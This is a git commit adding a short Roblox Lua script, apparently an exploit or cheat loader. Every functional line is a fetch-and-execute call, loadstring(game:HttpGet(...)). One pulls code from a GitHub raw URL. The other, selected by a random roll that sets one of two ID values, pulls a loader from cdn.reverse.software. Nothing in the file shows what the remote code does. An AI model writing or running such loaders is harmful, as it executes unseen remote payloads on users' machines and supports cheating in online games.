1c17be9bb2673a363c9fe331644bdd8880d138a5
Miguel7172 <romaozin1607@gmail.com>
2025-08-20 18:36:50 -0300

    Adicionando script8.lua automaticamente

---
+++ script8.lua
@@ -0,0 +1,11 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()
+
+
+local chance = math.random(1, 100)
+
+if chance <= 20 then
+    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+else
+    ID="ced02a72-af73-455e-af77-b0251f6eb"; loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
